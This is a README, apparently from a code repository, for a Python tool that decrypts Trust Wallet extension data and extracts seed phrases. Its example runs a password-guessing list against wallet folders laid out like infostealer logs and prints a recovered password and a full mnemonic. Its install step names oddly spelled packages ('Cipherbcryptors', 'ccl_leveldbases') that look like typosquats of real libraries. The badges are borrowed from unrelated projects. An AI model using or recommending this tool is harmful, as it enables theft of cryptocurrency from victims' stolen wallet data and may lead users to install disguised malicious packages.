# TrustDecoderss
[![N|Solid](https://cldup.com/dTxpPi9lDf.thumb.png)](https://nodesource.com/products/nsolid)

![](https://img.shields.io/github/stars/pandao/editor.md.svg) ![](https://img.shields.io/github/forks/pandao/editor.md.svg) ![](https://img.shields.io/github/tag/pandao/editor.md.svg) ![](https://img.shields.io/github/release/pandao/editor.md.svg) ![](https://img.shields.io/github/issues/pandao/editor.md.svg) ![](https://img.shields.io/bower/v/editor.md.svg)

Simple Tools for decode Trust wallet data, from extensions wallet, TrustWallet. - extract mnemonic phrase from you encrypted data with password.


## Installation
Install the dependencies and devDependencies and start the server.
**Python** 3.10.4 | https://www.python.org/downloads/ |** Add python.exe to PATH** | checkbox.

###### python -m pip install --upgrade pip

or u can install per one libs:
```sh
pip install pycryptodome	| pycryptodome 3.20.0
pip install Cipherbcryptors	| Cipherbcryptors 1.3.2
pip install ccl_leveldbases	| ccl-leveldbases 1.2.3
```


## Example

```python
from TrustDecoderss import extractWallets, trstDecode

data = extractWallets(r'C:/Users/Root/Desktop/Logs/wLogs/Wallet/Trust Wallet_Chrome_Default')
www = trstDecode(data, ["asdsadsadasdasd", "sadsadsa334fsd", "sda3246gfhjdgfkj", "orihj8dydgf", "12345677Iqbol@"])
print(www)
```
### Output:
```json
{'status': True, 'txt': 'Successful', 'pwd': '12345677Iqbol@', 'data': ['cupboard banner crumble power height despair pass off word input surface stay']}
```


For more information, see [docs.python-guide.org](http://docs.python-guide.org "docs.python-guide.org").



## License
MIT
>Decoder master project (c)